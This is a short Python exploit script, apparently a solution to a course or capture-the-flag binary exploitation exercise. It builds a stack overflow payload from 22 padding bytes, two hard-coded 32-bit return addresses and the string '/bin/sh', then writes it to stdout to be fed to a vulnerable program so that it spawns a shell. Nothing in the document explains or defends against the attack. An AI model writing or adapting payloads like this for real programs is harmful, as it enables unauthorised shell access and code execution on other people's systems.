from struct import pack 
from shellcode import shellcode
import sys
padding = 22
inj = ('\x12'*padding).encode('ASCII')+pack("<I", 0x08049d13)+pack("<I", 0x08049cf5)+b'/bin/sh'
sys.stdout.buffer.write(inj)
